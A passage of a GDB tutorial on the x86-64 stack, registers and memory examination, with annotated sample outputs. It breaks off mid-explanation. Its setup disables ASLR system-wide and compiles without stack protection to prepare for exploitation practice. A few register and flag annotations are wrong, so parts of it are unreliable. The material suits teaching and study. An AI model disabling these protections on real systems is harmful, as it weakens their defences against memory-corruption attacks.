# ╔══════════════════════════════════════════════════════════════╗
# ║   COMPLETE STACK ANALYSIS MASTER GUIDE                      ║
# ║   Theory + GDB Commands + Hex Explanation + Exploitation    ║
# ║   Every Single Digit Explained - Zero to Expert             ║
# ╚══════════════════════════════════════════════════════════════╝

---

# HOW TO READ THIS GUIDE

This guide has a strict format for every topic:

```
┌─ THEORY ─────────────────────────────────────────────────────┐
│ Complete explanation with visuals                             │
└──────────────────────────────────────────────────────────────┘
┌─ GDB COMMANDS ───────────────────────────────────────────────┐
│ Every command you can use with explanation                    │
└──────────────────────────────────────────────────────────────┘
┌─ OUTPUT ANALYSIS ────────────────────────────────────────────┐
│ Actual outputs with EVERY digit explained                     │
└──────────────────────────────────────────────────────────────┘
┌─ PRACTICE ───────────────────────────────────────────────────┐
│ Exercises to run right now                                    │
└──────────────────────────────────────────────────────────────┘
```

---

# PART 0 ─ SETUP EVERYTHING FIRST

## ENVIRONMENT SETUP

```bash
# ─────── Step 1: Create workspace ───────
mkdir -p ~/masterlab && cd ~/masterlab

# ─────── Step 2: Disable ASLR ───────
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
cat /proc/sys/kernel/randomize_va_space   # Must show: 0

# ─────── Step 3: Create the exact program from YOUR session ───────
cat > stack.c << 'EOF'
#include <stdio.h>

int main(int argc, char **argv) {
    int var1 = 10;
    int var2 = 300;
    char *ptr = "Hello World";
    return 0;
}
EOF

# ─────── Step 4: Compile (two versions) ───────
# Version A: With PIE (addresses NOT fixed)
gcc -g -O0 stack.c -o stack_pie

# Version B: Without PIE (addresses FIXED - matches your session)
gcc -no-pie -g -O0 -fno-stack-protector stack.c -o stack

# ─────── Step 5: Verify ───────
file stack
# Output: stack: ELF 64-bit LSB executable, x86-64, not stripped

readelf -h stack | grep -E "Type|Entry"
# Type: EXEC (not DYN = good, no PIE)
```

---

# PART 1 ─ WHAT IS A STACK: DEEP THEORY

## THEORY: THE STACK CONCEPT

**Real-world analogy — Stack of Dinner Plates:**
```
Adding plates (PUSH):          Removing plates (POP):

    ┌─────────┐                    ┌─────────┐
    │ Plate 3 │ ← added last       │         │ ← removed first
    ├─────────┤                    ├─────────┤
    │ Plate 2 │                    │ Plate 2 │
    ├─────────┤                    ├─────────┤
    │ Plate 1 │ ← added first      │ Plate 1 │ ← removed last
    └─────────┘                    └─────────┘

Rule: LAST IN = FIRST OUT (LIFO)
```

**In CPU Memory:**
```
HIGH ADDRESSES (e.g., 0x7FFFFFFFFFFF)
│
│   ┌────────────────────────────┐
│   │   Command line arguments   │  argv[], argc
│   │   Environment Variables    │  PATH=, HOME=, etc.
│   ├────────────────────────────┤
│   │                            │
│   │   S T A C K                │  ← Grows DOWNWARD ↓
│   │   (grows down)             │
│   │                            │
│   │   ← RSP points here        │  ← Current top of stack
│   │                            │
│   ├────────────────────────────┤
│   │   (empty space)            │
│   ├────────────────────────────┤
│   │   H E A P                  │  ← Grows UPWARD ↑
│   │   (grows up)               │
│   ├────────────────────────────┤
│   │   BSS segment              │  Uninitialized globals
│   ├────────────────────────────┤
│   │   Data segment             │  Initialized globals
│   ├────────────────────────────┤
│   │   Text segment (code)      │  Your program's instructions
│   └────────────────────────────┘
│
LOW ADDRESSES (e.g., 0x0000000000400000)
```

**Why the Stack Exists:**
```
Problem without stack:
  function1() calls function2() calls function3()
  Where does each function store its local variables?
  How does each function know where to return?
  How are arguments passed?

Solution: The Stack
  Each function call creates a "frame" on the stack
  Frame contains: local vars + saved registers + return address
  When function returns: frame is destroyed (RSP moves up)
```

**PUSH operation — Step by Step:**
```
BEFORE push rax  (rax = 0xDEADBEEF)
  RSP = 0x7fffffffe300
  Memory:
  0x7fffffffe300: [some value]   ← RSP
  0x7fffffffe2f8: [garbage]
  0x7fffffffe2f0: [garbage]

PUSH DOES TWO THINGS:
  Step 1: RSP = RSP - 8 = 0x7fffffffe2f8
  Step 2: [RSP] = RAX  → writes 0x00000000DEADBEEF to 0x7fffffffe2f8

AFTER push rax
  RSP = 0x7fffffffe2f8
  Memory:
  0x7fffffffe300: [some value]
  0x7fffffffe2f8: 0x00000000DEADBEEF   ← RSP (new top)
  0x7fffffffe2f0: [garbage]
```

**POP operation — Step by Step:**
```
BEFORE pop rbx
  RSP = 0x7fffffffe2f8
  Memory:
  0x7fffffffe300: [some value]
  0x7fffffffe2f8: 0x00000000DEADBEEF   ← RSP

POP DOES TWO THINGS:
  Step 1: RBX = [RSP] → reads 0x00000000DEADBEEF into RBX
  Step 2: RSP = RSP + 8 = 0x7fffffffe300

AFTER pop rbx
  RBX = 0x00000000DEADBEEF
  RSP = 0x7fffffffe300
  Memory:
  0x7fffffffe300: [some value]   ← RSP (restored)
  0x7fffffffe2f8: 0x00000000DEADBEEF   (still there, but "freed")
```

---

## GDB COMMANDS — Stack Basics

```gdb
# ─── Launch GDB ───
gdb -q stack                    # -q = quiet (no banner)
gdb -q stack -ex "break main"   # Start and immediately set breakpoint
gdb -q stack -x commands.gdb    # Load GDB script file

# ─── Check memory map (where is the stack?) ───
info proc mappings              # Full virtual memory map
maintenance info sections       # ELF sections
info sharedlibrary              # Loaded shared libraries

# ─── View stack memory ───
x/32gx $rsp                     # 32 quad-words from RSP
x/32xb $rsp                     # 32 bytes from RSP
x/16wx $rsp                     # 16 words (4-byte) from RSP

# ─── Stack pointer ───
print $rsp                      # RSP as decimal
print/x $rsp                    # RSP as hex
print/t $rsp                    # RSP as binary

# ─── Compare addresses ───
print $rbp - $rsp               # Frame size (bytes)
print/x ($rbp - $rsp)           # Frame size in hex

# ─── Track changes ───
display/x $rsp                  # Auto-print RSP each step
display/x $rbp                  # Auto-print RBP each step
display $rbp - $rsp             # Auto-print frame size each step
```

## OUTPUT ANALYSIS — info proc mappings

```gdb
(gdb) info proc mappings
```

**Actual Output:**
```
          Start Addr           End Addr       Size     Offset  Perms  objfile
      0x400000           0x401000         0x1000        0x0  r--p   /home/user/stack
      0x401000           0x402000         0x1000        0x0  r-xp   /home/user/stack
      0x402000           0x403000         0x1000        0x0  r--p   /home/user/stack
      0x403000           0x404000         0x1000        0x0  r--p   /home/user/stack
      0x404000           0x405000         0x1000     0x1000  rw-p   /home/user/stack
  0x7ffff7c00000     0x7ffff7c28000     0x28000        0x0  r--p   /usr/lib/libc.so.6
  0x7ffff7c28000     0x7ffff7dbd000    0x195000    0x28000  r-xp   /usr/lib/libc.so.6
  0x7ffffffde000     0x7ffffffff000     0x21000        0x0  rwxp   [stack]
```

**EVERY DIGIT EXPLAINED:**

```
Line: 0x7ffffffde000     0x7ffffffff000     0x21000        0x0  rwxp   [stack]
       ───────────────    ───────────────    ──────    ──────    ────
           │                    │               │         │        │
           │                    │               │         │        └─ Permissions:
           │                    │               │         │           r = readable
           │                    │               │         │           w = writable
           │                    │               │         │           x = executable
           │                    │               │         │           p = private (not shared)
           │                    │               │         │
           │                    │               │         └─ File offset: 0x0 means
           │                    │               │            starts from beginning of file
           │                    │               │
           │                    │               └─ Size: 0x21000 = 135,168 bytes = 132KB
           │                    │                  This is the total stack size
           │                    │                  0x21000 in decimal = 135,168
           │                    │                  Calculated: 0x7ffffffff000 - 0x7ffffffde000
           │                    │
           │                    └─ End Address: 0x7ffffffff000
           │                       Stack ends here (highest address)
           │                       0x7fff = high virtual address range (user space top)
           │                       fff = near maximum of this range
           │                       000 = page-aligned (always ends in 3 hex zeros = multiple of 0x1000)
           │
           └─ Start Address: 0x7ffffffde000
              Stack begins here (grows down from End Address)
              0x7fff = kernel boundary area for user space
              ffde = specific page within high memory
              000 = page-aligned (starts at page boundary)

Breaking down 0x7ffffffde000:
  0x    = prefix meaning "hexadecimal follows"
  7     = binary 0111, means bit 63 is 0 (user space, not kernel)
  f     = binary 1111
  f     = binary 1111
  f     = binary 1111
  f     = binary 1111
  f     = binary 1111
  f     = binary 1111
  f     = binary 1111
  d     = binary 1101
  e     = binary 1110
  000   = zeros = page boundary (4096-byte pages, 0x1000)
```

---

## PRACTICE — Stack Mapping

```gdb
# Start GDB
gdb -q stack

# Run program
break main
run

# ─── Exercise 1: Map the stack ───
info proc mappings

# Write down:
# Stack start: 0x________________
# Stack end:   0x________________
# Stack size:  0x________________ = ________ bytes

# ─── Exercise 2: Where is RSP? ───
print/x $rsp
# RSP: 0x________________
# Is it within stack range? YES / NO

# ─── Exercise 3: How far from stack end? ───
# Stack end is top (highest address)
# RSP should be somewhere inside the stack
set $stack_end = 0x7ffffffff000   # Replace with your value
print/d ($stack_end - $rsp)
# Distance from RSP to stack ceiling: ________ bytes

# ─── Exercise 4: View raw stack memory ───
x/32xb $rsp
# This shows 32 bytes, each byte as 2 hex digits

# ─── Exercise 5: Push and watch RSP ───
set $saved_rsp = $rsp
print/x $rsp        # Before

# Manually simulate a push
set $rsp = $rsp - 8
print/x $rsp        # After (should be 8 less)

print ($saved_rsp - $rsp)  # Should be 8

# Restore
set $rsp = $saved_rsp
```

---

# PART 2 ─ REGISTERS: DEEP THEORY

## THEORY: ALL REGISTERS EXPLAINED

### General Purpose Registers — Complete Visual Map

```
╔══════════════════════════════════════════════════════════════╗
║                   RAX  (64-bit)                              ║
║  ┌────────────────────────────────────────────────────────┐  ║
║  │ 63    56 55    48 47    40 39    32 31    24 23    16  │  ║
║  │ oooooooo oooooooo oooooooo oooooooo                    │  ║
║  │                             ├──────────────────────────┤  ║
║  │                             │       EAX  (32-bit)      │  ║
║  │                             │ 31    24 23    16         │  ║
║  │                             │ xxxxxxxx xxxxxxxx         │  ║
║  │                             │              ├────────────┤  ║
║  │                             │              │  AX 16-bit │  ║
║  │                             │              │  ┌──┬──┐   │  ║
║  │                             │              │  │AH│AL│   │  ║
║  │                             │              │  │8b│8b│   │  ║
║  └─────────────────────────────┴──────────────┴──┴──┘   ║
╚══════════════════════════════════════════════════════════════╝

Same pattern for: RBX/EBX/BX/BH/BL
                  RCX/ECX/CX/CH/CL
                  RDX/EDX/DX/DH/DL
```

### All 16 General Purpose Registers

```
Register  Size  Traditional Purpose           Preserved?  Arg#
───────────────────────────────────────────────────────────────
RAX       64    Return value / Accumulator     NO          -
RBX       64    General purpose                YES         -
RCX       64    Counter / 4th argument         NO          4
RDX       64    Data / 3rd argument            NO          3
RSI       64    Source index / 2nd arg         NO          2
RDI       64    Destination / 1st argument     NO          1
RBP       64    Base (frame) pointer           YES         -
RSP       64    Stack pointer                  YES(sort of)-
R8        64    5th argument                   NO          5
R9        64    6th argument                   NO          6
R10       64    Temporary                      NO          -
R11       64    Temporary                      NO          -
R12       64    General purpose                YES         -
R13       64    General purpose                YES         -
R14       64    General purpose                YES         -
R15       64    General purpose                YES         -

Preserved = callee must save/restore if it uses the register
```

### Special Registers

```
Register  Purpose
─────────────────────────────────────────────────────────────
RIP       Instruction Pointer - address of NEXT instruction
RFLAGS    Status flags - results of comparisons/arithmetic
CS        Code Segment (almost always 0x33 on Linux x86-64)
DS        Data Segment (almost always 0x00)
SS        Stack Segment (almost always 0x2b)
ES        Extra Segment (almost always 0x00)
FS        Thread Local Storage (important! FS:0x28 = canary)
GS        General Segment (used by kernel)
```

### RFLAGS — Every Bit Explained

```
RFLAGS register (64-bit):
Bits 63-22: Reserved (must be 0)
Bit 21: ID   - CPUID support
Bit 20: VIP  - Virtual interrupt pending
Bit 19: VIF  - Virtual interrupt flag
Bit 18: AC   - Alignment check
Bit 17: VM   - Virtual 8086 mode
Bit 16: RF   - Resume flag
Bit 14: NT   - Nested task
Bits 13-12: IOPL - I/O privilege level
Bit 11: OF   - Overflow flag    ← CRITICAL for exploits
Bit 10: DF   - Direction flag
Bit  9: IF   - Interrupt enable flag
Bit  8: TF   - Trap flag (single-step mode)
Bit  7: SF   - Sign flag        ← Was result negative?
Bit  6: ZF   - Zero flag        ← Was result zero?
Bit  4: AF   - Adjust flag
Bit  2: PF   - Parity flag
Bit  0: CF   - Carry flag       ← Unsigned overflow

Common RFLAGS value: 0x246
  0x246 = 0000 0010 0100 0110
                     │   ││└─ CF=0 (no carry)
                     │   │└── PF=1 (even parity)
                     │   └─── AF=0
                     └─────── ZF=1 (zero), PF=1
```

---

## GDB COMMANDS — Registers

```gdb
# ─── View registers ───
info registers                      # All integer registers
info registers rax rbx rcx rdx      # Specific registers
info registers rip rsp rbp          # Key control registers
info all-registers                  # ALL registers including SIMD
info registers eflags               # Flags register

# ─── Print register values ───
print $rax                          # Decimal
print/x $rax                        # Hexadecimal
print/d $rax                        # Decimal (signed)
print/u $rax                        # Decimal (unsigned)
print/o $rax                        # Octal
print/t $rax                        # Binary (t = two's complement)
print/c $rax                        # As character
print/f $rax                        # As float

# ─── Sub-registers ───
print $eax                          # Lower 32 bits of RAX
print $ax                           # Lower 16 bits
print $al                           # Lower 8 bits
print $ah                           # Bits 8-15 of RAX

# ─── Set register values ───
set $rax = 0x1234                   # Set RAX to hex value
set $rax = 100                      # Set RAX to decimal
set $rdi = 0x402004                 # Set pointer register
set $eax = -1                       # Set to -1 (0xFFFFFFFF)

# ─── Display (auto-print each step) ───
display $rax                        # Show RAX after every step
display/x $rbp                      # Show RBP in hex
display/x $rsp                      # Show RSP in hex
display $rbp - $rsp                 # Show frame size
display/i $rip                      # Show current instruction
display/8gx $rsp                    # Show 8 stack entries

undisplay                           # Remove all displays
undisplay 1                         # Remove display #1
info display                        # List all active displays

# ─── Register arithmetic ───
print $rbp - $rsp                   # Frame size
print $rsp + 8                      # Address 8 above RSP
print *(unsigned long *)$rbp        # Value at RBP (saved RBP)
print *(unsigned long *)($rbp + 8)  # Return address

# ─── Flags ───
info registers eflags               # Show flags
print $eflags                       # Flags value
set $eflags = 0x246                 # Set specific flags
```

## OUTPUT ANALYSIS — info registers

```gdb
(gdb) info registers
```

**Actual Output from YOUR Session:**
```
RAX: 0x0
RBX: 0x7fffffffe3b8
RCX: 0x403e40
RDX: 0x7fffffffe3c8
RSI: 0x7fffffffe3b8
RDI: 0x1
RBP: 0x7fffffffe330
RSP: 0x7fffffffe298
RIP: 0x401134
R8 : 0x0
R9 : 0x7ffff7fca380
R10: 0x7fffffffdfb0
R11: 0x203
R12: 0x1
R13: 0x0
R14: 0x403e40
R15: 0x7ffff7ffd000
EFLAGS: 0x246
```

**EVERY DIGIT AND REGISTER EXPLAINED:**

```
RAX: 0x0
│    └─ Value = 0x0 = decimal 0
│       This is the RETURN VALUE of main()
│       return 0; in C → RAX = 0 in assembly
│       0x0 = all bits zero
└─ Return value / accumulator register

RBX: 0x7fffffffe3b8
│    └─ Value = 0x7fffffffe3b8
│       7        = 0111 in binary (user space, bit 63=0)
│       f        = 1111
│       f        = 1111
│       f        = 1111
│       f        = 1111
│       f        = 1111
│       f        = 1111
│       e        = 1110
│       3        = 0011
│       b        = 1011
│       8        = 1000
│       This is a STACK ADDRESS (0x7fff... range = stack)
│       Points to the argv array (2nd argument register area)
└─ Callee-saved general purpose register

RCX: 0x403e40
│    └─ Value = 0x403e40
│       0x40 prefix = binary 0x400000 range = TEXT/DATA of your binary
│       3e40 = 16,192 (offset within binary)
│       0x403e40 is in your binary's address space
│       Points to __do_global_dtors_aux (cleanup function)
│       4th argument register (not used here)
└─ Counter / 4th argument register

RDX: 0x7fffffffe3c8
│    └─ Value = 0x7fffffffe3c8
│       Stack address (0x7fff... prefix)
│       Contains the environment variables pointer (envp)
│       This is the 3rd argument to main (envp = environment)
└─ 3rd argument register

RSI: 0x7fffffffe3b8
│    └─ Value = 0x7fffffffe3b8
│       Same as RBX here = stack address
│       This is argv (array of command-line argument strings)
│       Points to: [ptr_to_prog_name][NULL]
│       2nd argument to main
└─ 2nd argument register (Source Index)

RDI: 0x1
│    └─ Value = 0x1 = decimal 1
│       This is argc = 1 (one argument: the program name itself)
│       The program was run as: ./stack (no extra arguments)
│       If run as: ./stack hello  → RDI would be 2
└─ 1st argument register (Destination Index)

RBP: 0x7fffffffe330
│    └─ Value = 0x7fffffffe330
│       7fff = user space high memory (stack area)
│       e330 = specific address in stack
│       This is the FRAME BASE POINTER
│       Local variables are at RBP-offset
│       Return address is at RBP+8
│       Saved previous RBP is at RBP+0
└─ Frame base pointer (stable during function execution)

RSP: 0x7fffffffe298
│    └─ Value = 0x7fffffffe298
│       7fff = user space stack area
│       e298 = current top of stack position
│       At breakpoint (before ret), RSP points to return address
│       Distance from RBP: 0xe330 - 0xe298 = 0x98 = 152 bytes
│       This is the current stack frame size
└─ Stack top pointer (changes with every push/pop)

RIP: 0x401134
│    └─ Value = 0x401134
│       0x40 prefix = your binary's code section
│       1134 = offset to the 'ret' instruction in main
│       This IS the 'ret' instruction address
│       After ret: RIP will be loaded from stack (return address)
│       This matches <main+46>: ret in your disassembly
└─ Instruction pointer - NEXT instruction to execute

R8: 0x0
│   └─ Value = 0 = not used (5th argument, set to 0 by libc startup)
└─ 5th argument register

R9: 0x7ffff7fca380
│   └─ Value = 0x7ffff7fca380
│       7fff = user space
│       f7 = high bits common in libc/loader addresses
│       This points to _dl_fini() in dynamic linker
│       6th argument = not really used here
└─ 6th argument register

R10: 0x7fffffffdfb0
│    └─ Value = 0x7fffffffdfb0
│        Stack area address (7fff prefix)
│        Temporary scratch register
└─ Temporary register

R11: 0x203
│    └─ Value = 0x203 = 515 decimal
│        Binary: 0000 0010 0000 0011
│        This typically holds RFLAGS value during syscall
│        0x203 = CF=1, PF=1, IF=1 (interrupt enable)
└─ Temporary register (also holds RFLAGS in syscall)

R12: 0x1
│    └─ Value = 1 (argc saved by __libc_start_main)
└─ Callee-saved general purpose

R13: 0x0
│    └─ Value = 0 (not used)
└─ Callee-saved general purpose

R14: 0x403e40
│    └─ Same as RCX = points to __do_global_dtors_aux
│        Saved by __libc_start_main for cleanup
└─ Callee-saved general purpose

R15: 0x7ffff7ffd000
│    └─ 0x7fff = user space
│        f7ffd = dynamic linker (ld-linux) base address
│        Points to _dl_fini and loader data structures
└─ Callee-saved general purpose

EFLAGS: 0x246
│        └─ 0x246 in binary = 0000 0010 0100 0110
│            Bit  0 (CF): 0 = No carry/borrow
│            Bit  2 (PF): 1 = Even parity in last result
│            Bit  6 (ZF): 1 = Last result was ZERO (return 0)
│            Bit  9 (IF): 1 = Interrupts enabled
│            
│            ZF=1 makes sense: we just executed "mov eax, 0x0"
│            Zero result → Zero Flag set
└─ Flags register showing status of last operation
```

---

## PRACTICE — Registers

```bash
gcc -no-pie -g -O0 stack.c -o stack
gdb -q stack
```

```gdb
break main
run

# ─── Task 1: Print every register multiple ways ───
info registers
print/x $rax
print/d $rax
print/t $rax    # Binary
print/c $rax    # As character

# ─── Task 2: Set and verify ───
set $rax = 0x4142434445464748
print/x $rax     # Should show 0x4142434445464748
print $al        # Should show 0x48 (ASCII 'H')
print $ah        # Should show 0x47 (ASCII 'G')
print/c $al      # Should show 'H'

# ─── Task 3: Sub-register effects ───
set $rax = 0xFFFFFFFFFFFFFFFF
print/x $rax     # All F's

set $eax = 0x12345678
print/x $rax     # Upper 32 bits CLEARED!

set $rax = 0xFFFFFFFFFFFFFFFF
set $ax = 0x1234
print/x $rax     # Upper 48 bits PRESERVED

# ─── Task 4: Understanding EFLAGS ───
break *0x401133  # At 'pop rbp' in your binary (adjust address)
continue
info registers eflags
# What flags are set after mov eax, 0x0?

# ─── Task 5: Observe argument registers ───
# Run to function entry
break main
run
print $rdi       # Should be argc
print $rsi       # Should be argv address
x/s *(char **)$rsi  # Dereference argv[0] to see program name
```

---

# PART 3 ─ MEMORY AND ADDRESSING: DEEP THEORY

## THEORY: HOW MEMORY ADDRESSING WORKS

### Virtual Address Space Layout (x86-64)

```
Address Range          Size     Region           Description
─────────────────────────────────────────────────────────────────
0x0000000000000000 }
to                 } 128TB    User Space       Your programs live here
0x00007fffffffffff }

0x0000000000400000   ~1-4MB   .text            Your compiled code
0x0000000000401000            .plt             Procedure linkage table
0x0000000000402000            .rodata          Read-only data (strings)
0x0000000000403000            .data            Initialized globals
0x0000000000404000            .bss             Uninitialized globals
                              [heap grows UP]

0x7ffff7c00000     ~2MB       libc             C standard library
0x7ffff7ffd000     ~12KB      ld-linux         Dynamic linker

0x7ffffffde000     ~132KB     STACK            Local vars, ret addrs
  [stack grows DOWN]
0x7ffffffff000               Stack limit

0xffff800000000000 }
to                 } 128TB    Kernel Space     OS code (inaccessible)
0xffffffffffffffff }
```

### Understanding Address Structure (64-bit)

```
Address: 0x7fffffffe330
          │ │ │ │ │ │
          │ │ │ │ │ └─── Position in page (0x330 = 816 bytes offset)
          │ │ │ │ └───── Page table entry bits
          │ │ │ └─────── Middle directory bits
          │ │ └───────── Page directory bits
          │ └─────────── Page global directory bits
          └───────────── Sign extension (0x7fff = user space)

Full breakdown of 0x7fffffffe330:
  0x7fff = 0111 1111 1111 1111  (bits 63-48)
  ffff   = 1111 1111 1111 1111  (bits 47-32)
  e330   = 1110 0011 0011 0000  (bits 31-0)

Key facts:
  Bit 63 = 0 → User space (1 would be kernel space)
  0x7fff prefix → High user virtual memory (stack area)
  0x0040 prefix → Low user virtual memory (code area)
  0x7ffff7 prefix → Shared libraries (libc, ld-linux)
```

### Memory Addressing Modes (x86-64 Assembly)

```
Mode                    Example              What it means
──────────────────────────────────────────────────────────────────
Register                mov rax, rbx         Copy RBX into RAX
Immediate               mov rax, 42          Put value 42 into RAX
Direct                  mov rax, [0x402004]  Read from address 0x402004
Register indirect       mov rax, [rbx]       Read from address in RBX
Base + displacement     mov rax, [rbp-0x10]  Read from RBP minus 16
Base + index            mov rax, [rbx+rcx]   Read from RBX+RCX address
Base+index+disp         mov rax, [rbx+rcx+8] Read from RBX+RCX+8
Scaled index+disp       mov rax, [rbx+rcx*4] Read from RBX+(RCX×4)
```

### Little-Endian Storage — Critical for Hex Reading

```
CONCEPT: x86-64 stores values in LITTLE-ENDIAN order
         Least significant byte stored at LOWEST address

Value: 0x0000000000401106  (address of main function)

How it's stored in memory (at address 0x7fffffffe2b8):
    Address         Byte Stored    Significance
    0x7fffffffe2b8  0x06           Least significant byte (byte 0)
    0x7fffffffe2b9  0x11           Byte 1
    0x7fffffffe2ba  0x40           Byte 2
    0x7fffffffe2bb  0x00           Byte 3
    0x7fffffffe2bc  0x00           Byte 4
    0x7fffffffe2bd  0x00           Byte 5
    0x7fffffffe2be  0x00           Byte 6
    0x7fffffffe2bf  0x00           Most significant byte (byte 7)

When you examine: x/gx 0x7fffffffe2b8
GDB shows: 0x0000000000401106   ← Assembled in big-endian for display
But bytes in memory: 06 11 40 00 00 00 00 00 ← Actual storage order

When you examine: x/8xb 0x7fffffffe2b8
GDB shows: 0x06 0x11 0x40 0x00 0x00 0x00 0x00 0x00  ← Actual bytes
```

---

## GDB COMMANDS — Memory Examination

### The `x` Command — Most Important!

```
x/[Count][Format][Unit]  Address

Count:  How many units to display (default: 1)
Format: How to format the output
  x = hexadecimal
  d = decimal (signed)
  u = decimal (unsigned)
  o = octal
  t = binary (two)
  a = address (with symbol if known)
  c = character
  s = null-terminated string
  i = machine instruction (disassemble)
  f = float
  z = hexadecimal, padded with zeros
Unit:   Size of each unit
  b = byte (1 byte)
  h = halfword (2 bytes)
  w = word (4 bytes)
  g = giant/quadword (8 bytes)
```

### Complete Memory Examination Commands

```gdb
# ─── View raw bytes ───
x/1xb $rsp            # 1 byte  in hex at RSP
x/4xb $rsp            # 4 bytes in hex at RSP
x/8xb $rsp            # 8 bytes in hex (one 64-bit word)
x/16xb $rsp           # 16 bytes (two 64-bit words)
x/32xb $rsp           # 32 bytes
x/64xb $rsp           # 64 bytes (good for frame view)

# ─── View 4-byte words (DWORD - for int variables) ───
x/1xw $rsp            # 1 word  = 4 bytes
x/2xw $rsp            # 2 words = 8 bytes
x/4xw $rbp-0x10       # 4 words at local variable area
x/1dw $rbp-0x10       # 1 word as signed decimal (see int value)
x/1uw $rbp-0x10       # 1 word as unsigned decimal

# ─── View 8-byte giant/quadwords (QWORD - for pointers/long) ───
x/1gx $rsp            # 1 giant = 8 bytes in hex
x/2gx $rsp            # 2 giants = 16 bytes
x/8gx $rsp            # 8 giants = 64 bytes (good overview)
x/16gx $rsp           # 16 giants = 128 bytes
x/1gd $rsp            # 1 giant as signed decimal
x/1ga $rsp            # 1 giant as address (shows symbols!)

# ─── View strings ───
x/s 0x402004           # View null-terminated string at address
x/s $rax               # View string pointed to by RAX
x/2s 0x402004          # View 2 strings (finds next after first \0)

# ─── View instructions ───
x/5i $rip             # Disassemble 5 instructions at RIP
x/10i main            # Disassemble 10 instructions of main
x/5i $rip-10          # Show 10 bytes before RIP too
x/i $rip              # Current instruction only

# ─── View with address+symbol (very useful!) ───
x/1ga $rbp            # Shows: 0xaddr: 0xvalue <symbol>
x/1ga $rbp+8          # Return address with symbol name!

# ─── Stack examination ───
x/32gx $rsp           # View 32 quad-words from stack top
x/32gx $rbp-64        # View 64 bytes around frame base
x/4gx $rbp-32         # Local variable region
x/2gx $rbp            # See saved RBP and return address

# ─── Specific address examination ───
x/gx 0x401134         # View 8 bytes at specific address
x/i  0x401134         # View instruction at address
x/s  0x402004         # View string at data address

# ─── Find patterns in memory ───
find $rsp, +200, 0x41 # Find byte 0x41 in next 200 bytes of stack
find $rsp, +1000, "Hello"  # Find string in stack
```

## OUTPUT ANALYSIS — Memory Commands

### x/8gx $rsp

```gdb
(gdb) x/8gx $rsp
```

**Actual Output from YOUR Session:**
```
0x7fffffffe298: 0x00007ffff7c2a1ca  0x00007fffffffe2e0
0x7fffffffe2a8: 0x00007fffffffe3b8  0x0000000100400040
0x7fffffffe2b8: 0x0000000000401106  0x00007fffffffe3b8
0x7fffffffe2c8: 0x056d59bf55e5dada  0x0000000000000001
```

**EVERY DIGIT EXPLAINED:**

```
Line 1:
0x7fffffffe298: 0x00007ffff7c2a1ca  0x00007fffffffe2e0

Address: 0x7fffffffe298
│         7 = 0111 → user space, not kernel
│         f = 1111
│         f = 1111
│         f = 1111
│         f = 1111
│         f = 1111
│         f = 1111
│         e = 1110
│         298 = position within the stack page
│         THIS IS RSP (stack top) at the breakpoint
└───────────────────────────────────────────────────────

Value 1: 0x00007ffff7c2a1ca
│         00 00 = upper bytes = 0 (canonical address - required on x86-64)
│         7f = 0111 1111 → user space
│         ff = 1111 1111
│         f7 = 1111 0111 → this range = shared libraries (libc)
│         c2 = 1100 0010 → within libc
│         a1 = 1010 0001 → specific offset
│         ca = 1100 1010 → last byte of offset
│         
│         Full meaning: This is the RETURN ADDRESS from main()
│         It points to __libc_start_call_main+122
│         After main returns, execution goes here
│         f7c2a1ca is inside libc (f7 prefix = libc address range)
└───────────────────────────────────────────────────────

Value 2: 0x00007fffffffe2e0
│         00 00 = upper bytes = 0 (canonical)
│         7f ff ff = user space, stack range
│         ff e2 e0 = specific stack address
│         
│         This is a STACK ADDRESS (7fff prefix)
│         Points somewhere up the stack frame chain
│         This appears to be saved frame data from caller
└───────────────────────────────────────────────────────

Line 2:
0x7fffffffe2a8: 0x00007fffffffe3b8  0x0000000100400040

Address: 0x7fffffffe2a8
│         8 bytes above previous line (0x2a8 = 0x298 + 8)
└───────────────────────────────────────────────────────

Value 1: 0x00007fffffffe3b8
│         7fff... = stack address
│         e3b8 = specific stack position
│         This is the argv pointer (from RSI register)
│         Points to: [pointer to "/home/user/stack"][NULL]
└───────────────────────────────────────────────────────

Value 2: 0x0000000100400040
│         00 00 00 01 = the "1" part
│         00 40 00 40 = address 0x400040 (binary text section)
│         This is a packed value: 0x1 (argc) + 0x400040 (entry?)
│         Or: upper half = argc=1, lower half = some address
└───────────────────────────────────────────────────────

Line 3:
0x7fffffffe2b8: 0x0000000000401106  0x00007fffffffe3b8

Value 1: 0x0000000000401106
│         00 00 00 00 = upper zeros
│         00 40 = 0x400000 range = your binary
│         11 06 = offset 0x1106 within binary
│         
│         0x401106 = address of main() function!
│         This is how libc calls your main():
│         it stored main's address to call it
│         <main>: 0x401106 ← confirmed by disassembly
└───────────────────────────────────────────────────────

Value 2: 0x00007fffffffe3b8
│         Stack address again = argv
│         This appears multiple times as __libc_start_main
│         stores/copies argv pointer for its own use
└───────────────────────────────────────────────────────

Line 4:
0x7fffffffe2c8: 0x056d59bf55e5dada  0x0000000000000001

Value 1: 0x056d59bf55e5dada
│         05 6d 59 bf 55 e5 da da
│         This looks random/garbage → it's a STACK CANARY!
│         Or random initialization data
│         Real canary would be at RBP-8 in protected binary
│         Here it's just leftover stack data from previous runs
└───────────────────────────────────────────────────────

Value 2: 0x0000000000000001
│         All zeros except last byte = 1
│         This is the value 1 = argc
│         Stored on stack by __libc_start_main
└───────────────────────────────────────────────────────
```

### x/32xb $rsp (byte-level view)

```gdb
(gdb) x/32xb $rsp
```

**Output:**
```
0x7fffffffe298: 0xca 0xa1 0xc2 0xf7 0xff 0x7f 0x00 0x00
0x7fffffffe2a0: 0xe0 0xe2 0xff 0xff 0xff 0x7f 0x00 0x00
0x7fffffffe2a8: 0xb8 0xe3 0xff 0xff 0xff 0x7f 0x00 0x00
0x7fffffffe2b0: 0x40 0x00 0x40 0x00 0x01 0x00 0x00 0x00
```

**EVERY BYTE EXPLAINED (Line 1):**

```
0x7fffffffe298: 0xca 0xa1 0xc2 0xf7 0xff 0x7f 0x00 0x00

This is the return address 0x00007ffff7c2a1ca stored in LITTLE-ENDIAN:

Position in memory (low to high address):
  0x7fffffffe298: 0xca  ← Byte 0 (least significant)
  0x7fffffffe299: 0xa1  ← Byte 1
  0x7fffffffe29a: 0xc2  ← Byte 2
  0x7fffffffe29b: 0xf7  ← Byte 3
  0x7fffffffe29c: 0xff  ← Byte 4
  0x7fffffffe29d: 0x7f  ← Byte 5
  0x7fffffffe29e: 0x00  ← Byte 6
  0x7fffffffe29f: 0x00  ← Byte 7 (most significant)

Reading as 64-bit value (reverse bytes): 
  00 00 7f ff f7 c2 a1 ca → 0x00007ffff7c2a1ca

That's the return address!

Each individual byte:
